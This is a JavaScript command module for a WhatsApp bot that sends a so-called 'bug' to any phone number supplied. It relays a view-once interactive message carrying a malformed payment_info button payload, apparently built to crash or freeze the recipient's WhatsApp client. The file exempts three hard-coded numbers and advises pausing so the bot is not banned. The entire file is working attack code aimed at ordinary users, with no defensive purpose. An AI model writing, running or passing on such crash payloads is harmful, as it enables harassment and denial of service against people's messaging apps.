module.exports = {
  usage: ["beta-new", "wa-ori", "wa-busins", "wa-mod"],
  desc: "Send bug using specific WhatsApp versions",
  commandType: "Bug",
  isGroupOnly: false,
  isAdminOnly: false,
  isPrivateOnly: false,
  emoji: '🔺',

  async execute(sock, m, args) {
    const text = args[0];
    
    if (!text) {
      return kord.freply(m, `Usage: .beta-new 6281234567890`);
    }

    let peler = text.replace(/[^0-9]/g, '');
    if (peler.startsWith('0')) {
      return kord.freply(m, `Example: .beta-new 6281234567890`);
    }

    var contactInfo = await sock.onWhatsApp(peler + "@s.whatsapp.net");
    let whatsappNumber = peler + '@s.whatsapp.net';

    // Skip specific numbers
    if (["916909137213", "919366316008", "919402104403"].includes(peler)) {
      return;
    }

    if (contactInfo.length == 0) {
      return kord.freply(m, "The number is not registered on WhatsApp");
    }

    // Function to send the bug
    async function BugPay(jid) {
      await sock.relayMessage(
        jid,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {},
              },
              interactiveMessage: {
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: 'payment_info',
                      buttonParamsJson: '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
                    },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: jid } },
        { messageId: null }
      );
    }

    // Send the bug
    await BugPay(whatsappNumber);

    // Send confirmation message
    await sock.sendMessage(m.key.remoteJid, {
      text: `Successfully sent Bug to @${whatsappNumber.split('@')[0]} using *beta-new* ✅\n\nPause for 2 minutes so that the bot is not banned.`,
      mentions: [whatsappNumber]
    });
  }
};